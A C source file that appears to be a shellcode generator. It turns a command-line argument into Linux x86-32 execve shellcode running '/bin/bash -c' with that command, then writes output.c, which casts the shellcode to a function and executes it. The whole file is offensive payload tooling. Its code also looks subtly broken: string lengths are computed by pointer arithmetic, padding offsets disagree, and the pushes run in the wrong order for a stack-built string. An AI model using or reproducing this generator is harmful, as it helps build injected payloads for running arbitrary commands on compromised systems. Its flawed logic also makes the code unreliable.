#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]){
	if(argc == 2){
		int blackSlashPadding = (4-((14+strlen(argv[1])+1)%4));
		// argv length + /bin/bash -c "" length and extra for null byte
		char *shellcode = calloc((strlen(argv[1]+15+blackSlashPadding+1)),sizeof(char));
		for(int i = 0;i < blackSlashPadding; i = i +1){
			strncpy(&shellcode[i],"/",1);
		}
		strncpy(&shellcode[(blackSlashPadding-1)],"/bin/bash -c \"",14);
		strncpy(&shellcode[(blackSlashPadding-1+14)],argv[1],strlen(argv[1]));
		strncpy(&shellcode[(blackSlashPadding-1+14+strlen(argv[1]))],"\"",1);

		FILE *f;
		f = fopen("output.c","w");
		fprintf(f, "%s\n","#include <stdio.h>");
		fprintf(f, "%s\n","#include <unistd.h>");
		fprintf(f, "//linux-32\n");
		fprintf(f, "%s","char *shellcode=\"");
		//"\x31\xc0" xor    %eax,%eax
		//"\x50" push   %eax
		fprintf(f, "%s","\\x31\\xc0\\x50");

		for(int i = 0; i < (strlen(argv[1]+15+blackSlashPadding+1)); i = i + 4){
			fprintf(f,"%s","\\x68");
			fprintf(f,"\\x%x",shellcode[i]);
			fprintf(f,"\\x%x",shellcode[i+1]);
			fprintf(f,"\\x%x",shellcode[i+2]);
			fprintf(f,"\\x%x",shellcode[i+3]);
		}

		fprintf(f, "%s","\\x89\\xe3\\x50\\x89\\xe1\\xb0\\x0b\\xcd\\x80");
		//"\x89\xe3" mov    %esp,%ebx
		//"\x50" push   %eax
		//"\x89\xe1" mov    %esp,%ecx
		//"\xb0\x0b" mov    $0xb,%al
		//"\xcd\x80" int    $0x80
		fprintf(f, "%s\n\n","\";");	
		fprintf(f, "%s\n","int main(){");
		fprintf(f, "%s\n","    int (*ret)() = (int(*)())shellcode;");
		fprintf(f, "%s\n","    ret();");
		fprintf(f, "%s\n","}");
		fclose(f);
	}else{
		printf("\\x%02X\n",'A');
	}
}
